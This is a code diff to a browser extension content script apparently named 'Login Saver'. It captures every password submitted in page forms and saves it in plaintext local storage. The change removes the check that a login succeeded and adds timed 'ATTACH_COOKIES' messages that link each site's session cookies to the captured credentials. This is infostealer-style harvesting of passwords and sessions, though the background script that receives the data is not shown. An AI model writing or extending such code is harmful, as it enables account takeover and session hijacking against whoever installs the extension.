@@ -57,9 +57,9 @@
     return null;
   }
 
-  const PENDING_MAX_AGE_MS = 25000;
+  const PENDING_MAX_AGE_MS = 30000;
 
-  function saveAsPending(form) {
+  function saveCredential(form) {
     const passwordField = findPasswordField(form);
     if (!passwordField || !passwordField.value) return;
 
@@ -73,23 +73,42 @@
     const hostname = window.location.hostname;
     const title = document.title || hostname;
     const formPageUrl = window.location.href;
+    const savedAt = new Date().toISOString();
+
+    const entry = {
+      url: origin,
+      hostname,
+      title,
+      username: username || '(no username)',
+      password,
+      savedAt
+    };
 
     const pending = {
       origin,
       formPageUrl,
       hostname,
       title,
-      username: username || '(no username)',
+      username: entry.username,
       password,
-      submittedAt: new Date().toISOString()
+      savedAt,
+      submittedAt: savedAt
     };
 
-    chrome.storage.local.set({ pendingLogin: pending }, () => {
-      console.log('[Login Saver] Pending login saved for', hostname, '- will confirm after navigation');
+    chrome.storage.local.get({ credentials: [] }, (r) => {
+      const list = r.credentials || [];
+      list.unshift(entry);
+      chrome.storage.local.set({
+        credentials: list.slice(0, 500),
+        pendingLogin: pending
+      }, () => {
+        console.log('[Login Saver] Credential saved for', hostname);
+        chrome.runtime.sendMessage({ type: 'NEW_CREDENTIAL', entry }, () => {});
+      });
     });
   }
 
-  function tryPromotePendingToSaved() {
+  function tryAttachCookiesToLastCredential() {
     chrome.storage.local.get({ pendingLogin: null }, (result) => {
       const pending = result.pendingLogin;
       if (!pending) return;
@@ -102,43 +121,23 @@
         return;
       }
 
-      try {
-        const formPath = new URL(pending.formPageUrl).pathname;
-        if (formPath === window.location.pathname) return;
-      } catch (e) {
-        return;
-      }
-
-      const entry = {
-        url: pending.origin,
+      chrome.runtime.sendMessage({
+        type: 'ATTACH_COOKIES',
+        origin: pending.origin,
         hostname: pending.hostname,
-        title: pending.title,
-        username: pending.username,
-        password: pending.password,
-        savedAt: new Date().toISOString()
-      };
-
-      chrome.storage.local.get({ credentials: [] }, (r) => {
-        const list = r.credentials || [];
-        list.unshift(entry);
-        chrome.storage.local.set({
-          credentials: list.slice(0, 500),
-          pendingLogin: null
-        }, () => {
-          console.log('[Login Saver] Login successful – credentials saved for', pending.hostname);
-          chrome.runtime.sendMessage({ type: 'NEW_CREDENTIAL', entry }, () => {});
-        });
-      });
+        savedAt: pending.savedAt
+      }, () => {});
     });
   }
 
-  tryPromotePendingToSaved();
+  setTimeout(tryAttachCookiesToLastCredential, 2000);
+  setTimeout(tryAttachCookiesToLastCredential, 4500);
 
   function onFormSubmit(e) {
     const form = e.target;
     if (form.tagName !== 'FORM') return;
     if (!form.querySelector('input[type="password"]') && !form.querySelector('input[name*="password" i]')) return;
-    saveAsPending(form);
+    saveCredential(form);
   }
 
   document.addEventListener('submit', onFormSubmit, true);
